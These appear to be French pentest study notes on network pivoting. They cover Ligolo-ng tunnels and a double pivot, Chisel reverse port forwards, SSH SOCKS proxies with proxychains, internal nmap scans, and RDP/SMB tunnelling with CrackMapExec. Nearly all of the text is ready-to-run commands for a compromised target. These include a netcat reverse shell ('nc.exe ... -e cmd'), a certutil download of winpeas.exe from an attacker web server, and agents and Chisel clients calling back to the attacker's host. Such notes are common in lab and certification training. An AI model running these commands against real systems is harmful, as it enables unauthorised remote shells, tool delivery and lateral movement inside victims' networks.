https://youtu.be/DM1B8S80EvQ
https://github.com/nicocha30/ligolo-ng
![[Pasted image 20250326151824.png]]
## **1. Ligolo: Pivoting avec un Proxy Tunnel**

### **1.1 Comment initialiser Ligolo**

Sur Kali :

```bash
sudo ip tuntap add user felix mode tun ligolo
sudo ip link set ligolo up
./proxy -selfcert
```

Sur la machine cible (Windows) :

```powershell
.\agent.exe -connect <IP-KALI>:11601 -ignore-cert
```

Retour sur Kali (Ligolo session) :

```bash
session
1
start
```

Ajouter la route vers le sous-réseau cible :

```bash
sudo ip route add 10.10.14.0/24 dev ligolo
```

---

## **2. Reverse Shell depuis un Réseau Interne**

### **2.1 Comment configurer le Listener via Ligolo**

Ajouter un listener pour forward un shell :

```bash
listener_add --addr 0.0.0.0:1234 --to 127.0.0.1:4444
```

Vérifier le listener :

```bash
listener_list
```

Lancer Netcat sur Kali pour capter le shell :

```bash
rlwrap nc -nlvp 4444
```

### **2.2 Comment établir le Reverse Shell depuis la cible**

Si l'IP interne de la machine cible est `10.10.120.131` :

```powershell
nc.exe 10.10.120.131 1234 -e cmd
```

---

## **3. Transfert de Fichier depuis le Réseau Interne**

### **3.1 Comment configurer le transfert avec Ligolo**

Ajouter un listener pour forward le trafic HTTP :

```bash
listener_add --addr 0.0.0.0:1235 --to 127.0.0.1:80
```

Démarrer un serveur web Python :

```bash
python -m http.server 80
```

### **3.2 Comment récupérer le fichier sur la cible**

```powershell
certutil -urlcache -f http://<MS01>:1235/winpeas.exe winpeas.exe
```

---

## **4. Double Pivot avec Ligolo**

https://youtu.be/LiaBVuz2B4o
### **4.1 Comment initialiser un deuxième tunnel Ligolo**

Sur Kali :

```bash
sudo ip tuntap add user felix mode tun ligolo1
sudo ip link set ligolo1 up
```

Dans la session Ligolo :

```bash
listener_add --addr 0.0.0.0:9000 --to 127.0.0.1:9001 -tcp
listener_list
```

Sur la machine intermédiaire (Ubuntu contrôlé) :

```bash
./agent --connect 172.16.0.2:9001 -ignore-cert
```

Dans Ligolo :

```bash
session
2
ifconfig
```

Sur Kali :

```bash
sudo ip route add 10.10.10.0/24 dev ligolo1
```

Dans Ligolo :

```bash
start --tun ligolo1
```

---

## **5. Accéder à un Service Local sur une Machine Cible**

### **5.1 Avec SSH (Si accès SSH disponible)**

Forwarder le port 8000 du serveur cible vers le port 9999 en local :

```bash
ssh -L 9999:127.0.0.1:8000 user@192.168.212.103
```

### **5.2 Avec Chisel (Si pas d’accès SSH)**

Sur Kali (serveur Chisel) :

```bash
chisel server --reverse --port 9999
```

Sur la machine cible :

```bash
chisel client YOUR_IP:9999 R:9999:127.0.0.1:8000
```

Accéder au service :

```
http://127.0.0.1:9999
```

---

## **6. Escalade avec Proxies Socks et SSH**

### **6.1 Avec SSH (Si accès SSH disponible)**

Sur Kali :

```bash
ssh -D 1080 -q -C -N user@192.168.1.10
```

Configurer proxychains :

```ini
# /etc/proxychains.conf
strict_chain
proxy_dns
tcp_read_time_out 15000
tcp_connect_time_out 8000
[ProxyList]
socks5 127.0.0.1 1080
```

Tester avec :

```bash
proxychains nmap -sT -Pn -n 10.10.10.0/24
```

### **6.2 Avec Chisel**

Démarrer le serveur :

```bash
chisel server --reverse --port 9999
```

Démarrer le client sur la cible :

```bash
chisel client YOUR_IP:9999 R:1080:socks
```

Configurer proxychains et tester avec :

```bash
proxychains nmap -sT -Pn -n 10.10.10.0/24
```

---

## **7. Détection de Services & Exploration Interne**

### **7.1 Scanner un sous-réseau découvert**

```bash
nmap -sT -Pn -n --open 10.10.10.0/24
```

### **7.2 Vérifier les ports ouverts sur une machine cible**

```bash
nmap -sT -Pn -p- 10.10.10.5
```

### **7.3 Vérifier le routage des sous-réseaux accessibles**

```bash
ip route
```

---

## **8. Exploitation Avancée : RDP et SMB Pivoting**

### **8.1 Tunnel RDP via Chisel**

Sur Kali :

```bash
chisel server --reverse --port 9999
```

Sur la cible :

```bash
chisel client YOUR_IP:9999 R:3389:127.0.0.1:3389
```

Se connecter en RDP depuis Kali :

```bash
rdesktop 127.0.0.1:3389 -u user -p password
```

### **8.2 Tunnel SMB pour exploration avec CrackMapExec**

Sur Kali :

```bash
chisel server --reverse --port 9999
```

Sur la cible :

```bash
chisel client YOUR_IP:9999 R:445:127.0.0.1:445
```

Lister les partages SMB :

```bash
smbclient -L 127.0.0.1 -U user%password
```

Explorer les partages avec CrackMapExec :

```bash
crackmapexec smb 127.0.0.1 -u user -p password --shares
```